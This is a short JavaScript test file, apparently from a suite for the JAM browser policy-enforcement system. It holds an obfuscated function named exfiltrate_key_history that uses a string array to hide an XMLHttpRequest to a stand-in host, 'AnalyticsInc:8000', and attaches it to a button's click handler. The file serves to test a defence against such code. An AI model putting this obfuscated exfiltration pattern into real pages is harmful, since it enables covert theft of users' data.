// exfil_test_obfu.js
function exfiltrate_key_history() {
  var _0x2e14 = ["GET", "http://AnalyticsInc:8000/submission.html?", "test=java_obfuscator", "open", "send"];
  xmlhttp = new XMLHttpRequest;
  introspect(JAM.policy.p1) {
    var v0 = _0x2e14[3]
  }
  introspect(JAM.policy.p1) {
    var v1 = _0x2e14[0]
  }
  introspect(JAM.policy.p1) {
    var v5 = _0x2e14[1]
  }
  introspect(JAM.policy.p1) {
    var v6 = _0x2e14[2]
  }
  JAM.call(JAM.get(xmlhttp, v0, JAM.policy.p1), xmlhttp, [v1, v5 + v6, true]);
  introspect(JAM.policy.p1) {
    var v3 = _0x2e14[4]
  }
  JAM.call(JAM.get(xmlhttp, v3, JAM.policy.p1), xmlhttp, [null]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

